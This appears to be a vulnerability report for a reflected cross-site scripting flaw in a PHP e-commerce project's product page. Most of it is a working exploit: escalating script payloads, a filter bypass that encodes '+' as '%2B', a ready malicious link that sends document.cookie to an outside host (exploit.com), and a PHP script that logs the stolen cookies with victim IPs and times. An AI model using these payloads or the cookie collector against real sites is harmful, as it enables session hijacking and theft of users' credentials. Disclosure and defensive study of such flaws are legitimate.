0x01 Vulnerability description

    There are many open source CMS-Frameworks in itsourcecode website.
	There is an XSS(Cross Site Scripting) vulnerability in the open source framework e-commerce-website-in-php-with-source-code。
	An attacker inserts malicious javascript code into a web page. The code is triggered when the user visits, allowing the attacker to obtain the user cookie.

0x02 Recurrence of the vulnerability

    This is the page with the XSS vulnerability.
	The path of the page on the local server is: http://itscode.com/ecommerce/product.php?product=dell-inspiron-15-5000-15.
![1.png](https://github.com/Don-H50/itsourcecode-web-vulnerability/blob/main/images/0420-1.png)

    Enter the payload in the URL bar: "><sCrIpT>alert(1)</sCrIpT>. An alert pop-up will appear, so there is an XSS vulnerability.
![2.png](https://github.com/Don-H50/itsourcecode-web-vulnerability/blob/main/images/0420-2.png)

「EXP」
 
Purpose: By clicking on the malicious URL link constructed by the attacker, the user will leak his own cookie.
    
    Change the payload to: "><sCrIpT>alert(document.cookie)</sCrIpT>.
	We can see the user cookie information in the pop-up window(The webpage is not logged in, so only PHPSESSID information is returned).
![3.png](https://github.com/Don-H50/itsourcecode-web-vulnerability/blob/main/images/0420-3.png)
    
    Build a listening server locally to receive the cookie information of the target user.
    Write a PHP script 'getcookie.php' on the server to remotely receive cookie information.
	The function of this script is to write the received cookie into the 'cookie.txt'.
	At this point the payload is: "><sCrIpT>document.location='http://exploit.com/get.php?cookie='+document.cookie</sCrIpT>.
    We extend the payload to the URL to make a request, find that there is no user's cookie in the 'cookie.txt' file of the remote server.
	Check the source code of the web page and find that the '+' in the script tag is filtered.
![4.png](https://github.com/Don-H50/itsourcecode-web-vulnerability/blob/main/images/0420-4.png)
  
    So try to convert '+' to URL encoding '%2B'.
	Construct a new payload: "><sCrIpT>document.location='http://exploit.com/get.php?cookie='%2Bdocument.cookie</sCrIpT>
    Enter payload in the URL bar.
![5.png](https://github.com/Don-H50/itsourcecode-web-vulnerability/blob/main/images/0420-5.png)
    
    The web page has been redirected.
![6.png](https://github.com/Don-H50/itsourcecode-web-vulnerability/blob/main/images/0420-6.png)
    
    At this point, the user cookie has been sent to the local listening server.
![7.png](https://github.com/Don-H50/itsourcecode-web-vulnerability/blob/main/images/0420-7.png)
    
    
    Merge the payload and URL to construct a malicious URL link:
	http://itscode.com/ecommerce/product.php?product=dell-inspiron-15-5000-15？"><sCrIpT>document.location='http://exploit.com/get.php?cookie='%2Bdocument.cookie</sCrIpT>
    The user causes the leakage of his own cookie by clicking on the malicious link.
	
The simple 'getcookie.php' script:
	
	<?php
	$cookie = $_GET['cookie'];
	$ip = getenv ('REMOTE_ADDR');
	$time = date('Y-m-d g:i:s');
	$fp = fopen("cookie.txt","a");
	fwrite($fp,"IP: ".$ip."Date: ".$time." Cookie:".$cookie."\n");
	fclose($fp);
	?> 
